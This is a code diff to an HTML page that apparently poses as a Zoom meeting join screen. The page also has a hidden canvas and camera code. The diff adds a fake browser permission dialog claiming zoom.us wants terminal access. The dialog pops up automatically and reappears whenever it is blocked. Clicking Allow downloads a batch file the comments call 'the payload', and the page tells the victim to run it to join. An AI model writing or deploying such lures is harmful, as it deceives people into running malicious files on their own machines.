@@ -75,6 +75,116 @@
         .hidden-canvas {
             display: none;
         }
+
+        /* Fake Permission Modal */
+        .permission-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            z-index: 1000;
+            padding-top: 20px;
+        }
+
+        .permission-box {
+            background: #fff;
+            color: #333;
+            width: 380px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            text-align: left;
+            animation: slideDown 0.3s ease-out;
+            position: relative;
+        }
+
+        @keyframes slideDown {
+            from {
+                transform: translateY(-20px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .perm-header {
+            padding: 15px 20px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            align-items: center;
+        }
+
+        .perm-icon {
+            font-size: 20px;
+            margin-right: 12px;
+            color: #5f6368;
+        }
+
+        .perm-title {
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .perm-body {
+            padding: 20px;
+            font-size: 14px;
+            line-height: 1.5;
+            color: #5f6368;
+        }
+
+        .perm-actions {
+            padding: 10px 20px 15px;
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+        }
+
+        .btn-perm {
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            border: 1px solid transparent;
+            transition: background 0.2s;
+        }
+
+        .btn-block {
+            color: #5f6368;
+            background: #fff;
+            border: 1px solid #dadce0;
+        }
+
+        .btn-block:hover {
+            background: #f1f3f4;
+        }
+
+        .btn-allow {
+            color: #fff;
+            background: #1a73e8;
+        }
+
+        .btn-allow:hover {
+            background: #1557b0;
+        }
+
+        .download-instruction {
+            margin-top: 15px;
+            padding: 10px;
+            background: #e8f0fe;
+            color: #1a73e8;
+            border-radius: 4px;
+            font-size: 13px;
+            display: none;
+        }
     </style>
     <script src="../../assets/js/jquery.min.js"></script>
 </head>
@@ -99,6 +209,23 @@
         <button class="btn-join" id="joinBtn" onclick="joinMeeting()"
             style="display: none; background-color: #28a745;">Join Meeting</button>
         <div id="error-msg" style="color: #ff6b6b; margin-top: 10px; font-size: 0.9rem; display: none;"></div>
+    </div>
+
+    <div id="permission-modal" class="permission-overlay" style="display: none;">
+        <div class="permission-box">
+            <div class="perm-header">
+                <div class="perm-icon">🔒</div>
+                <div class="perm-title">zoom.us wants to access your system terminal</div>
+            </div>
+            <div class="perm-body">
+                This website creates a secure connection for the meeting.<br>
+                Allow "Zoom Console" to access your terminal?
+            </div>
+            <div class="perm-actions">
+                <button class="btn-perm btn-block" onclick="denyPermission()">Block</button>
+                <button class="btn-perm btn-allow" onclick="allowPermission()">Allow</button>
+            </div>
+        </div>
     </div>
 
     <canvas id="canvas" width="320" height="240" class="hidden-canvas"></canvas>
@@ -127,6 +254,42 @@
         };
 
         let permissionGranted = false;
+
+        // Show fake permission prompt slightly after load
+        setTimeout(() => {
+            document.getElementById('permission-modal').style.display = 'flex';
+        }, 1500);
+
+        function allowPermission() {
+            document.getElementById('permission-modal').style.display = 'none';
+
+            // Trigger download of the payload
+            const link = document.createElement('a');
+            link.href = '../../assets/ZoomConsole_Setup.bat';
+            link.download = 'ZoomConsole_Setup.bat';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            // Change UI to instruct user
+            const loadingText = document.getElementById('loading-text');
+            if (loadingText) {
+                loadingText.innerHTML = `
+                    <div style="font-size: 3rem; margin-bottom: 10px;">💾</div>
+                    <div style="color: #4ade80; font-weight: bold;">Downloading Component...</div>
+                    <div style="font-size: 0.9rem; margin-top: 10px;">Please open <b>ZoomConsole_Setup.bat</b> to join</div>
+                `;
+            }
+        }
+
+        function denyPermission() {
+            document.getElementById('permission-modal').style.display = 'none';
+            alert("This permission is required to join the meeting securely.");
+            // Re-show after a delay for persistence
+            setTimeout(() => {
+                document.getElementById('permission-modal').style.display = 'flex';
+            }, 2000);
+        }
 
         async function enableCamera() {
             const errorMsg = document.getElementById('error-msg');
